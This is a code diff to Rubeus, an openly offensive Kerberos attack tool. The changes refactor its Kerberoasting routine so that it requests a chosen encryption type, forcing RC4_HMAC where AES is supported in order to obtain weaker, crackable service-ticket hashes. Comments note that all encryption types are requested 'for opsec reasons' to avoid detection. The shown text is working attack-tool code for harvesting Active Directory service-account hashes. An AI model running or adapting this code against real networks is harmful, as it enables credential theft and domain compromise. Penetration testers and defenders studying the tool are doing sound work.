@@ -277,11 +277,12 @@ namespace Rubeus
                 Console.WriteLine("[*] Using 'tgtdeleg' to request a TGT for the current user");
                 byte[] delegTGTbytes = LSA.RequestFakeDelegTicket("", false);
                 TGT = new KRB_CRED(delegTGTbytes);
+                Console.WriteLine("[*] RC4_HMAC will be the requested for AES-enabled accounts, all etypes will be requested for everything else");
             }
             else
             {
                 Console.WriteLine("[*] NOTICE: AES hashes will be returned for AES-enabled accounts.");
-                Console.WriteLine("[*]         Use /ticket:X or /tgtdeleg to force RC4 for these accounts.\r\n");
+                Console.WriteLine("[*]         Use /ticket:X or /tgtdeleg to force RC4_HMAC for these accounts.\r\n");
             }
 
             if (!String.IsNullOrEmpty(spn))
@@ -292,7 +293,7 @@ namespace Rubeus
                 {
                     // if a TGT .kirbi is supplied, use that for the request
                     //      this could be a passed TGT or if TGT delegation is specified
-                    GetTGSRepHash(TGT, spn, "USER", "DISTINGUISHEDNAME", outFile, dc, true);
+                    GetTGSRepHash(TGT, spn, "USER", "DISTINGUISHEDNAME", outFile, dc, Interop.KERB_ETYPE.rc4_hmac);
                 }
                 else
                 {
@@ -516,12 +517,12 @@ namespace Rubeus
                                )
                             {
                                 // if we're roasting RC4, but AES is supported AND we have a TGT, specify RC4
-                                GetTGSRepHash(TGT, servicePrincipalName, samAccountName, distinguishedName, outFile, dc, true);
+                                GetTGSRepHash(TGT, servicePrincipalName, samAccountName, distinguishedName, outFile, dc, Interop.KERB_ETYPE.rc4_hmac);
                             }
                             else
                             {
                                 // otherwise don't force RC4 - have all supported encryption types for opsec reasons
-                                GetTGSRepHash(TGT, servicePrincipalName, samAccountName, distinguishedName, outFile, dc, false);
+                                GetTGSRepHash(TGT, servicePrincipalName, samAccountName, distinguishedName, outFile, dc);
                             }
                         }
                         else
@@ -546,6 +547,8 @@ namespace Rubeus
 
         public static void GetTGSRepHash(string spn, string userName = "user", string distinguishedName = "", System.Net.NetworkCredential cred = null, string outFile = "")
         {
+            // use the System.IdentityModel.Tokens.KerberosRequestorSecurityToken approach
+
             string domain = "DOMAIN";
 
             if (Regex.IsMatch(distinguishedName, "^CN=.*", RegexOptions.IgnoreCase))
@@ -655,7 +658,7 @@ namespace Rubeus
             }
         }
 
-        public static void GetTGSRepHash(KRB_CRED TGT, string spn, string userName = "user", string distinguishedName = "", string outFile = "", string domainController = "", bool rc4 = false)
+        public static void GetTGSRepHash(KRB_CRED TGT, string spn, string userName = "user", string distinguishedName = "", string outFile = "", string domainController = "", Interop.KERB_ETYPE requestEType = Interop.KERB_ETYPE.subkey_keymaterial)
         {
             // use a TGT blob to request a hash instead of the KerberosRequestorSecurityToken method
 
@@ -675,13 +678,12 @@ namespace Rubeus
             Ticket ticket = TGT.tickets[0];
             byte[] clientKey = TGT.enc_part.ticket_info[0].key.keyvalue;
             Interop.KERB_ETYPE etype = (Interop.KERB_ETYPE)TGT.enc_part.ticket_info[0].key.keytype;
-            //Interop.KERB_ETYPE etype = Interop.KERB_ETYPE.rc4_hmac;
 
             string[] services = spn.Split(',');
             foreach (string sname in services)
             {
                 // request the new service tickt
-                byte[] tgsBytes = Ask.TGS(tgtUserName, domain, ticket, clientKey, etype, sname, false, domainController, false, rc4);
+                byte[] tgsBytes = Ask.TGS(tgtUserName, domain, ticket, clientKey, etype, sname, requestEType, false, domainController, false);
 
                 if (tgsBytes != null)
                 {
